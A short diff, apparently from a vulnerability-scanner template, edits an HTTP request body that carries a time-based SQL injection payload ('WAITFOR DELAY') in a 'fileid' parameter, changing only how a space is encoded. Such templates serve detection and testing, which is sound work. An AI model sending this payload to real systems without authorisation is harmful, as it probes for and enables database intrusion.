@@ -18,7 +18,7 @@ http:
       - Accept:*/* & Accept-Encoding:gzip, deflate
     body: 
       - |
-        fileid=2+WAITFOR DELAY+'0:0:5'&isFromOutImg=1
+        fileid=2+WAITFOR+DELAY+'0:0:5'&isFromOutImg=1
     
 
     matchers-condition: and
